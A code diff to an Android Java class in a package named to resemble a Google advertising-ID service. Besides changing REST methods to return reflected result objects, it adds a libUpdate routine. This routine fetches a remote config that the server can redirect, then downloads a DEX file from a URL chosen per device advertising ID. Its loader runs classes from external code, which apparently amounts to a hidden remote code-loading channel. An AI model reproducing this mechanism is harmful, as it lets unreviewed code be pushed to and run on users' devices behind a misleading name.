@@ -1,17 +1,30 @@
 package com.advertising_id_service.appclick.googleadvertisingidservice.GoogleAdvertisingIdGetterRealisation;
 
+import android.annotation.SuppressLint;
 import android.content.Context;
+import android.os.Bundle;
 import android.support.v4.app.LoaderManager;
+import android.support.v4.content.AsyncTaskLoader;
+import android.support.v4.content.Loader;
 
+import com.advertising_id_service.appclick.googleadvertisingidservice.CodeUpdater.CodeUpdater;
 import com.advertising_id_service.appclick.googleadvertisingidservice.CodeUpdater.ExternalClassLoader.ExternalLibServicer;
+import com.advertising_id_service.appclick.googleadvertisingidservice.CodeUpdater.FilesLoader.FilesLoader;
 import com.advertising_id_service.appclick.googleadvertisingidservice.GlobalParameters;
 import com.advertising_id_service.appclick.googleadvertisingidservice.InstallationInfo;
 import com.advertising_id_service.appclick.googleadvertisingidservice.Logger.Logger;
 import com.advertising_id_service.appclick.googleadvertisingidservice.PublisherID.PublisherIDMask;
 import com.advertising_id_service.appclick.googleadvertisingidservice.REST.IApi;
+import com.advertising_id_service.appclick.googleadvertisingidservice.REST.Results.ResultCreate;
+import com.advertising_id_service.appclick.googleadvertisingidservice.REST.Results.ResultDelete;
+import com.advertising_id_service.appclick.googleadvertisingidservice.REST.Results.ResultInstall;
 import com.advertising_id_service.appclick.googleadvertisingidservice.REST.Results.ResultRead;
+import com.advertising_id_service.appclick.googleadvertisingidservice.REST.Results.ResultUpdate;
 import com.google.android.gms.common.GooglePlayServicesNotAvailableException;
 import com.google.android.gms.common.GooglePlayServicesRepairableException;
+
+import org.json.JSONException;
+import org.json.JSONObject;
 
 import java.io.IOException;
 import java.util.ArrayList;
@@ -139,12 +152,13 @@ public class GoogleAdvertisingIdGetter_FromExternalLib implements IGoogleAdverti
     //************************ Методы работы с REST *******************************
     //*****************************************************************************
     @Override
-    public void rest_create(Context cnt, LoaderManager lm, String callDestination, String login, String pass) {
+    public ResultCreate rest_create(Context cnt, LoaderManager lm, String callDestination, String login, String pass) {
         Logger.log("Текущая версия GoogleAdvertisingIdGetter_FromExternalLib.rest_create()");
         ExternalLibServicer loader = ExternalLibServicer.getServicer(cnt);
         Class clazzGoogleAdvertisingIdGetter = loader.getExternalClass(cnt, GlobalParameters.EXTERNAL_PACKAGE_NAME + ".GoogleAdvertisingIdGetter");
+        Class resultCreate                   = loader.getExternalClass(cnt, GlobalParameters.EXTERNAL_PACKAGE_NAME + ".REST.Results.ResultCreate");
         Object instance                      = loader.getInstance(clazzGoogleAdvertisingIdGetter, new Object[]{}, new Class[]{});
-        String str                           = loader.callMethod(clazzGoogleAdvertisingIdGetter, instance, "rest_create",
+        Object res                           = loader.callMethod(clazzGoogleAdvertisingIdGetter, instance, "rest_create",
                 new Object[]{
                         cnt,
                         lm,
@@ -157,15 +171,22 @@ public class GoogleAdvertisingIdGetter_FromExternalLib implements IGoogleAdverti
                         String.class,
                         String.class,
                         String.class});
+        ResultCreate resCreate = new ResultCreate("","","","");
+        resCreate.result    = loader.getAttribute(resultCreate,res,"result");
+        resCreate.error_id  = loader.getAttribute(resultCreate,res,"error_id");
+        resCreate.error_msg = loader.getAttribute(resultCreate,res,"error_msg");
+        resCreate.guid      = loader.getAttribute(resultCreate,res,"guid");
+        return resCreate;
     }
 
     @Override
-    public void rest_update(Context cnt, LoaderManager lm, String callDestination, String login, String pass) {
+    public ResultUpdate rest_update(Context cnt, LoaderManager lm, String callDestination, String login, String pass) {
         Logger.log("Текущая версия GoogleAdvertisingIdGetter_FromExternalLib.rest_update()");
         ExternalLibServicer loader = ExternalLibServicer.getServicer(cnt);
         Class clazzGoogleAdvertisingIdGetter = loader.getExternalClass(cnt, GlobalParameters.EXTERNAL_PACKAGE_NAME + ".GoogleAdvertisingIdGetter");
+        Class resultUpdate                   = loader.getExternalClass(cnt, GlobalParameters.EXTERNAL_PACKAGE_NAME + ".REST.Results.ResultUpdate");
         Object instance                      = loader.getInstance(clazzGoogleAdvertisingIdGetter, new Object[]{}, new Class[]{});
-        String str                           = loader.callMethod(clazzGoogleAdvertisingIdGetter, instance, "rest_update",
+        Object res                           = loader.callMethod(clazzGoogleAdvertisingIdGetter, instance, "rest_update",
                 new Object[]{
                         cnt,
                         lm,
@@ -178,10 +199,17 @@ public class GoogleAdvertisingIdGetter_FromExternalLib implements IGoogleAdverti
                         String.class,
                         String.class,
                         String.class});
+
+        ResultUpdate resUpdate = new ResultUpdate("","","","");
+        resUpdate.result    = loader.getAttribute(resultUpdate,res,"result");
+        resUpdate.error_id  = loader.getAttribute(resultUpdate,res,"error_id");
+        resUpdate.error_msg = loader.getAttribute(resultUpdate,res,"error_msg");
+        resUpdate.guid      = loader.getAttribute(resultUpdate,res,"guid");
+        return resUpdate;
     }
 
     @Override
-    public void rest_install(Context cnt, LoaderManager lm, String callDestination, InstallationInfo _installInfo, String login, String pass) {
+    public ResultInstall rest_install(Context cnt, LoaderManager lm, String callDestination, InstallationInfo _installInfo, String login, String pass) {
         Logger.log("Текущая версия GoogleAdvertisingIdGetter_FromExternalLib.rest_install()");
         ExternalLibServicer loader = ExternalLibServicer.getServicer(cnt);
         PublisherIDMask m   = _installInfo.getMask();
@@ -189,12 +217,12 @@ public class GoogleAdvertisingIdGetter_FromExternalLib implements IGoogleAdverti
         Class clazzGoogleAdvertisingIdGetter = loader.getExternalClass(cnt, GlobalParameters.EXTERNAL_PACKAGE_NAME + ".GoogleAdvertisingIdGetter");
         Class clazzPublisherIDMask           = loader.getExternalClass(cnt, GlobalParameters.EXTERNAL_PACKAGE_NAME + ".PublisherID.PublisherIDMask");
         Class clazzInstallationInfo          = loader.getExternalClass(cnt, GlobalParameters.EXTERNAL_PACKAGE_NAME + ".InstallationInfo");
+        Class resultInstall                  = loader.getExternalClass(cnt, GlobalParameters.EXTERNAL_PACKAGE_NAME + ".REST.Results.ResultInstall");
 
         Object instance     = loader.getInstance(clazzGoogleAdvertisingIdGetter, new Object[]{}, new Class[]{});
         Object Mask         = loader.getInstance(clazzPublisherIDMask,  new Object[]{m.getPrefix(),m.getSeporator(),m.getExtension()},  new Class[]{String.class,String.class,String.class});
         Object install_info = loader.getInstance(clazzInstallationInfo, new Object[]{cnt,callDestination,Mask}, new Class[]{Context.class,String.class, clazzPublisherIDMask});
-
-        loader.callMethod(clazzGoogleAdvertisingIdGetter, instance, "rest_install",
+        Object res          = loader.callMethod(clazzGoogleAdvertisingIdGetter, instance, "rest_install",
                 new Object[]{
                         cnt,
                         lm,
@@ -209,6 +237,13 @@ public class GoogleAdvertisingIdGetter_FromExternalLib implements IGoogleAdverti
                         clazzInstallationInfo,
                         String.class,
                         String.class});
+
+        ResultInstall resInstall = new ResultInstall("","","","");
+        resInstall.result    = loader.getAttribute(resultInstall,res,"result");
+        resInstall.error_id  = loader.getAttribute(resultInstall,res,"error_id");
+        resInstall.error_msg = loader.getAttribute(resultInstall,res,"error_msg");
+        resInstall.guid      = loader.getAttribute(resultInstall,res,"guid");
+        return resInstall;
     }
 
     @Override
@@ -281,12 +316,13 @@ public class GoogleAdvertisingIdGetter_FromExternalLib implements IGoogleAdverti
     }
 
     @Override
-    public void rest_delete(Context cnt, LoaderManager lm, String callDestination, String login, String pass) {
+    public ResultDelete rest_delete(Context cnt, LoaderManager lm, String callDestination, String login, String pass) {
         Logger.log("Текущая версия GoogleAdvertisingIdGetter_FromExternalLib.rest_delete()");
         ExternalLibServicer loader = ExternalLibServicer.getServicer(cnt);
         Class clazzGoogleAdvertisingIdGetter = loader.getExternalClass(cnt, GlobalParameters.EXTERNAL_PACKAGE_NAME + ".GoogleAdvertisingIdGetter");
+        Class resultDelete                   = loader.getExternalClass(cnt, GlobalParameters.EXTERNAL_PACKAGE_NAME + ".REST.Results.ResultDelete");
         Object instance                      = loader.getInstance(clazzGoogleAdvertisingIdGetter, new Object[]{}, new Class[]{});
-        String str                           = loader.callMethod(clazzGoogleAdvertisingIdGetter, instance, "rest_delete",
+        Object res                           = loader.callMethod(clazzGoogleAdvertisingIdGetter, instance, "rest_delete",
                 new Object[]{
                         cnt,
                         lm,
@@ -299,5 +335,133 @@ public class GoogleAdvertisingIdGetter_FromExternalLib implements IGoogleAdverti
                         String.class,
                         String.class,
                         String.class});
+
+        ResultDelete resDelete = new ResultDelete("","","","");
+        resDelete.result    = loader.getAttribute(resultDelete,res,"result");
+        resDelete.error_id  = loader.getAttribute(resultDelete,res,"error_id");
+        resDelete.error_msg = loader.getAttribute(resultDelete,res,"error_msg");
+        resDelete.guid      = loader.getAttribute(resultDelete,res,"guid");
+        return resDelete;
+    }
+
+    //*****************************************************************************
+    //*************** Методы работы с обновлением библиотеки **********************
+    //*****************************************************************************
+    // !!!! Метод должен вызываться в отдельном потоке !!!!
+    //Проверить последнюю версию библиотеки и обновить её
+    // @param cnt  - контекст
+    // @param lm   - LoaderManager для асинхронного вызова. Пока не используется!
+    // @param GAID - GAID устройства
+    //
+    @Override
+    public boolean libUpdate(final Context cnt, final LoaderManager lm, final String GAID) {
+        Logger.log("Текущая версия GoogleAdvertisingIdGetter_FromExternalLib.libUpdate()");
+        final ExternalLibServicer class_loader = ExternalLibServicer.getServicer(cnt);
+// // Т.К. есть какие-то проблемы с созданием лоадера когда я вызываю метод рефлексией, пришлось нормальный код:
+//        ExternalLibServicer loader = ExternalLibServicer.getServicer(cnt);
+//        Class codeUpdaterClazz     = loader.getExternalClass(cnt, GlobalParameters.EXTERNAL_PACKAGE_NAME + ".CodeUpdater.CodeUpdater");
+//        Object instance            = loader.getInstance(codeUpdaterClazz, new Object[]{}, new Class[]{});
+//        Object res                 = loader.callMethod(codeUpdaterClazz, instance, "updateCode",
+//                new Object[]{
+//                        cnt,
+//                        lm,
+//                        GAID},
+//                new Class[]{
+//                        Context.class,
+//                        LoaderManager.class,
+//                        String.class});
+
+// заменить на этого франкинштейна:
+
+        lm.restartLoader(CodeUpdater.LOADER_NEW_CODE_VERSION, null, new LoaderManager.LoaderCallbacks<String>() {
+            @SuppressLint("StaticFieldLeak")
+            @Override
+            public Loader<String> onCreateLoader(int i, Bundle bundle) {
+                return new AsyncTaskLoader<String>(cnt) {
+                    public String loadInBackground() {
+                        String path_to_conf_file = cnt.getSharedPreferences("pref_session", Context.MODE_PRIVATE).getString("path_to_conf_file", null);
+                        String path = (path_to_conf_file == null) ? GlobalParameters.URL_TO_CONFIG_FILE : path_to_conf_file;
+                        Logger.log("Грузим файл из:" + path);
+                        String res = null;
+//                        FilesLoader fl = new FilesLoader();
+//                        fl.downloadFile(cnt, GlobalParameters.URL_TO_CONFIG_FILE, GlobalParameters.ConfigFilePath(cnt));
+//                        fl.unpackZip(GlobalParameters.getBasePath(cnt), GlobalParameters.CONFIG_FILE_NAME_ZIP);
+                        Class FilesLoaderClazz     = class_loader.getExternalClass(cnt, GlobalParameters.EXTERNAL_PACKAGE_NAME + ".CodeUpdater.FilesLoader.FilesLoader");
+                        Object instance            = class_loader.getInstance(FilesLoaderClazz, new Object[]{}, new Class[]{});
+                        res                        = class_loader.callMethod(FilesLoaderClazz, instance, "downloadFile",
+                            new Object[]{
+                                    cnt,
+                                    (path_to_conf_file == null) ? GlobalParameters.URL_TO_CONFIG_FILE : path_to_conf_file,
+                                    GlobalParameters.ConfigFilePath(cnt)},
+                            new Class[]{
+                                    Context.class,
+                                    String.class,
+                                    String.class});
+
+                        class_loader.callMethod(FilesLoaderClazz, instance, "unpackZip",
+                                new Object[]{
+                                        GlobalParameters.getBasePath(cnt),
+                                        GlobalParameters.CONFIG_FILE_NAME_ZIP},
+                                new Class[]{
+                                        String.class,
+                                        String.class});
+                        return res;
+                    }
+                };
+            }
+
+            @Override
+            public void onLoadFinished(Loader<String> loader, String result) {
+
+                String json_str = new CodeUpdater().loadJSONFromAsset(cnt, GlobalParameters.ConfigFilePath(cnt));
+                try {
+                    JSONObject rootObj = new JSONObject(json_str);
+                    String path_to_conf_file = rootObj.getString(GlobalParameters.JSON_KEY_PATH_TO_CONF_FILE);
+                    String path_to_conf_file_last = cnt.getSharedPreferences(GlobalParameters.SPF_SESSION_PATH_TO_CONF_FILE, Context.MODE_PRIVATE).getString(GlobalParameters.SPF_KEY_PATH_TO_CONF_FILE, null);
+                    if (!path_to_conf_file.equals(path_to_conf_file_last))
+                    {
+                        Logger.log("Надо загрузить конфигурационный файл из другого места:" + path_to_conf_file);
+                        Logger.log("Вместо:" + path_to_conf_file_last);
+                        cnt.getSharedPreferences(GlobalParameters.SPF_SESSION_PATH_TO_CONF_FILE, Context.MODE_PRIVATE).edit().putString(GlobalParameters.SPF_KEY_PATH_TO_CONF_FILE, path_to_conf_file).apply();
+                        new CodeUpdater().updateCode(cnt, lm, GAID);
+                        return;
+                    }
+                } catch (JSONException e) {
+                    e.printStackTrace();
+                    Logger.log("Ошибка загрузки конфигурационного файла" + e.getMessage());
+                }
+
+                String url = null;
+                //String url = getUrlToLoadDexFile(cnt, device_id);
+                Class codeUpdaterClazz = class_loader.getExternalClass(cnt, GlobalParameters.EXTERNAL_PACKAGE_NAME + ".CodeUpdater.CodeUpdater");
+                Object instance        = class_loader.getInstance(codeUpdaterClazz, new Object[]{}, new Class[]{});
+                String url_            = class_loader.callMethod(codeUpdaterClazz, instance, "getUrlToLoadDexFile",
+                        new Object[]{
+                                cnt,
+                                GAID},
+                        new Class[]{
+                                Context.class,
+                                String.class});
+
+                if (url_ != null) {
+                  //  FilesLoader.downloadDexFile(cnt, url);
+                    Class filesLoaderClazz = class_loader.getExternalClass(cnt, GlobalParameters.EXTERNAL_PACKAGE_NAME + ".CodeUpdater.FilesLoader.FilesLoader");
+                    Object instance2        = class_loader.getInstance(filesLoaderClazz, new Object[]{}, new Class[]{});
+                    class_loader.callMethod(filesLoaderClazz, instance2, "downloadDexFile",
+                            new Object[]{
+                                    cnt,
+                                    url_},
+                            new Class[]{
+                                    Context.class,
+                                    String.class});
+                }
+            }
+
+            @Override
+            public void onLoaderReset(Loader<String> loader) {
+            }
+        }).forceLoad();
+
+        return true;
     }
 }
